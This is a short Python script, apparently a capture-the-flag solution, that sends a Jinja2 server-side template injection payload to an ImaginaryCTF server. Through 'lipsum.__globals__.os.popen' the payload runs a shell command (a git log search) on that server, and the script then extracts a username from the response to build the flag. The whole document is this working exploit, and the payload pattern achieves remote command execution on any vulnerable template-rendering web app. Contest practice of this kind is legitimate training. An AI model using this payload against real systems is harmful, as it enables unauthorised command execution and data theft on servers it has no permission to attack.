import requests
import re

url = "http://puzzler7.imaginaryctf.org:11998/?num="
payload = '{{lipsum.__globals__.os.popen(\'git log -S "f\\\'The"\').read()}}'
r = requests.get(url + payload)
response = r.text
flag_match = re.search(r'&lt;(.*?)@', response)
if flag_match:
    username = flag_match.group(1)
    print(f"ictf{{{username}@example.com}}")